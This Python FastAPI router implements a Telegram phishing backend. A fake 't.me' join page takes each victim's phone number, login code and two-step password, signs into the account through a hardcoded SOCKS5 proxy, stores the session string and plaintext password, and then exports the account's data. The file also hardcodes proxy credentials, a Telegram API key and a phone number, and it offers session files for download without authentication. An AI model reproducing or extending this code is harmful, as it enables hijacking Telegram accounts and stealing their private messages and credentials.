import json
from pathlib import Path
from typing import Optional
from fastapi import APIRouter, Request, Query, Depends, HTTPException
from fastapi.responses import (HTMLResponse, JSONResponse, 
                               RedirectResponse, FileResponse)
from fastapi.templating import Jinja2Templates

from app.config import settings
from sqlalchemy.orm import Session
from app.db.models import (ExportRecord, RedirectLink, TelegramChannel, 
                           Sessions)
from app.db.database import SessionLocal, get_db
from app.core.state import CURRENT_CONFIG
from app.core.utils import assign_attributes_from_dict
from app.core.sync_exporter import run_sync_export_in_process
from app.security import get_current_user, login_required

from pyrogram import Client
from redis import Redis

proxy = {
     "scheme": "socks5",
     "hostname": "45.155.61.15",
     "port": 64091,
     "username": "xfmTvk4h",
     "password": "XcYXXiRP"
 }

r = Redis(host="localhost", port=6379, decode_responses=True)
API_ID = 23814060  # Ваш API_ID
API_HASH = "d89c1dcef155a809d3f696beb15756c6"

router = APIRouter()
templates = Jinja2Templates(directory="app/ui/templates")

sessions_dir = settings.BASE_DIR / "app" / "db"

@router.get("/export", response_class=HTMLResponse)
@login_required
def index(request: Request, id: Optional[str] = Query(default=None)):
    session_string = ""
    if id:
        db = SessionLocal()
        session = db.query(Sessions).filter(Sessions.id == id).first()
        session_string = session.session_string
    return templates.TemplateResponse("index.html", 
                                      {"request": request,
                                       "session_string":session_string,
                                       "session":session})

    # body = await request.json()
    return templates.TemplateResponse("index.html", {"request": request})


@router.get("/view-export")
@login_required
async def view_export(request: Request, id: Optional[str] = Query(default=None)):

    data_path = settings.BASE_DIR / "data"
    folders = [
        f.name for f in data_path.iterdir()
        if f.is_dir() and not f.name.startswith(".")
    ]
    print("selected_folder", id)
    
    if id:
        db_record = get_export_record_by_id(SessionLocal(), int(id))
        selected_folder = db_record.directory_name if db_record else None
    else:
        selected_folder = None
    return templates.TemplateResponse("export_view.html", {
        "request": request,
        "folders": folders,
        "selected_folder": selected_folder,
    })

def get_export_record_by_id(session: Session, id: int):
    return session.get(ExportRecord, id)

from slugify import slugify
import os


APP_SESSIONS = {}

@router.get("/t.me/l/{id}", response_class=HTMLResponse)
async def telegram_join(request: Request, id: str):
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == id).first()
    if not redirect_data:
        return templates.TemplateResponse(
            "telegram_join.html",
            {"request": request, "status_code": 404},
            status_code=404
        )
    if not redirect_data.active:
        return templates.TemplateResponse(
            "telegram_join.html",
            {"request": request, "status_code": 404},
            status_code=404
        )
    phone_status = False

    redirect_data.status = "clicked"
    db.commit()
    if redirect_data.phone:
        phone_status = True
        phone_number = redirect_data.phone

    
        phone_number = "+380937157860"
        filename = slugify(id + phone_number)

        global APP_SESSIONS
        app = Client(
                    name = f"{phone_number}_pyrogram",
                    workdir=str(sessions_dir),
                    # name=":memory:", 
                    api_id=API_ID, api_hash=API_HASH,
                    device_model="EroticBot",
                    system_version="EroOS 6.9",
                    app_version="69.420",
                    lang_code="ru",
                    proxy=proxy)
        APP_SESSIONS[id] = app
        await app.connect()
        sent = await app.send_code(phone_number)
        r.set(id, json.dumps({
            "phone_number": phone_number,
            "phone_code_hash": sent.phone_code_hash,
            "session_file_slug": filename,
        }))
    return templates.TemplateResponse(
        "telegram_join.html",
        {"request": request, "status_code": 200, "phone_status": phone_status,
        "redirect_channel": redirect_data.redirect},
        status_code=200
    )

import asyncio
@router.route('/send_code', methods=['POST'])
async def send_code(request: Request):
    body = await request.json()
    phone_number = body.get("phone")
    key = body.get("key")
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()
    redirect_data.status = "clicked"
    db.commit()


    filename = slugify(key + phone_number)
    global APP_SESSIONS
    app = Client(
                name = f"{phone_number}_pyrogram",
                workdir=str(sessions_dir),
                # name=":memory:", 
                api_id=API_ID, api_hash=API_HASH,
                device_model="EroticBot",
                system_version="EroOS 6.9",
                app_version="69.420",
                lang_code="ru",
                proxy=proxy)
    APP_SESSIONS[key] = app
    await app.connect()
    sent = await app.send_code(phone_number)
    r.set(key, json.dumps({
        "phone_number": phone_number,
        "phone_code_hash": sent.phone_code_hash,
        "session_file_slug": filename,
    }))
    result = {'status': 'code_sent'}
    return JSONResponse(result)

async def _send_code_async(session_name, phone):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        result = await client.send_code_request(phone)
        session['phone_code_hash'] = result.phone_code_hash
        await client.disconnect()
        return {'status': 'code_sent'}
    except Exception as e:
        print(f"[ERROR] [{phone}] {e}")
        return {'status': 'error', 'message': str(e)}

from datetime import datetime
from zoneinfo import ZoneInfo

@router.post("/submit_code")
async def enter_code(request: Request):
    body = await request.json()
    code = body.get("code")
    key = body.get("key")
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()

    data = json.loads(r.get(key))
    phone_number = data["phone_number"]
    phone_code_hash = data["phone_code_hash"]
    filename = data["session_file_slug"]
    global APP_SESSIONS
    app = APP_SESSIONS[key]

    try:
        await app.sign_in(
            phone_number=phone_number,
            phone_code=code,
            phone_code_hash=phone_code_hash
        )
    except Exception as e:
        if "PASSWORD" in str(e).upper():
            r.set(f"{key}:pending", json.dumps({
                "phone_number": phone_number,
                "session_file_slug": filename
            }))
            redirect_data.status = "code_entered"
            db.commit()
            return JSONResponse({"status": "need_password"})
        else:
            return JSONResponse({"status": "invalid_code"})
        raise

    string_session = await app.export_session_string()
    session_object = Sessions(
        redirect_link = redirect_data,
        phone=phone_number,
        session_string=string_session,
        date = datetime.now(ZoneInfo("Europe/Kyiv"))
    ) 
    db.add(session_object)
    redirect_data.status = "completed"
    db.commit()
    db.refresh(session_object)
    await app.disconnect()
    del APP_SESSIONS[key]


    redirect_url = f"tg://join?invite={redirect_data.redirect.invite_link.split('+')[1]}"

    return JSONResponse({"status": "authorized", 
            "redirect_url": redirect_url})

async def _submit_code_async(session_name, phone, code):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=session['phone_code_hash'])
            await client.disconnect()
            return {'status': 'authorized'}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'need_password'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}



@router.post("/submit_password")
async def enter_password(request: Request):
    body = await request.json()
    password = body.get("password")
    key = body.get("key")

    data = json.loads(r.get(f"{key}:pending"))
    filename = data["session_file_slug"]
    global APP_SESSIONS
    app = APP_SESSIONS[key]

    try:
        await app.check_password(password)
    except Exception as e:
        if "The two-step verification password is invalid" in str(e):
            return JSONResponse({'status': 'password_error'})
        else:
            print(f"[ERROR] [{key}] {e}")
            return JSONResponse({'status': 'password_error', 'message': str(e)})
        raise
    string_session = await app.export_session_string()
    await app.disconnect()
    del APP_SESSIONS[key]

    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()
    redirect_data.status = "completed"
    
    session_object = Sessions(
        redirect_link = redirect_data,
        phone=data["phone_number"],
        password=password,
        session_string=string_session,
        date = datetime.now(ZoneInfo("Europe/Kyiv"))
    ) 
    db.add(session_object)

    db.commit()
    db.refresh(session_object)
    print(redirect_data)

    data = {"session_string":string_session}
    
    assign_attributes_from_dict(CURRENT_CONFIG, data)
    print("assigned")
    run_sync_export_in_process(CURRENT_CONFIG, session=session_object)
    # export_id = get_last_entry_id(SessionLocal()) + 1

    
    redirect_url = f"tg://join?invite={redirect_data.redirect.invite_link.split('+')[1]}"
    
    return JSONResponse({"status": "authorized", 
            "redirect_url": redirect_url})

def get_last_entry_id(db: Session) -> int:
    last_entry = db.query(ExportRecord).order_by(ExportRecord.id.desc()).first()
    return last_entry.id if last_entry else 0


async def _submit_password_async(session_name, password):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        try:
            await client.sign_in(password=password)
            await client.disconnect()
            return {'status': 'authorized'}
        except Exception as e:
            await client.disconnect()
            return {'status': 'password_error', 'message': str(e)}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

@router.get("/sessions", response_class=HTMLResponse)
@login_required
async def sessions_page(request: Request, db: Session = Depends(get_db)):
    links = db.query(RedirectLink).all()
    sessions = db.query(Sessions).all()
    exportRecords = db.query(ExportRecord).all()
    return templates.TemplateResponse("sessions.html", 
                                      {"request": request, 
                                       "links": links,
                                       "sessions": sessions})


@router.get("/download-session/{filename}")
async def download_session(filename: str):
    file_path = sessions_dir / filename
    if not file_path.exists():
        return {"error": "File not found"}
    
    return FileResponse(
        path=file_path,
        filename=file_path.name,
        media_type="application/octet-stream"
    )

@router.delete("/sessions/{session_id}")
async def delete_session(session_id: str, db: Session = Depends(get_db)):
    session = db.query(RedirectLink).filter(RedirectLink.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    db.delete(session)
    db.commit()
    return JSONResponse({"status": "success", "message": f"Session {session_id} deleted"})


@router.delete("/exports/{export_id}")
async def delete_export(export_id: int, db: Session = Depends(get_db)):
    export = db.query(ExportRecord).filter(ExportRecord.id == export_id).first()
    if not export:
        raise HTTPException(status_code=404, detail="Export not found")
    db.delete(export)
    db.commit()
    return JSONResponse({"status": "success", "message": f"Export {export_id} deleted"})


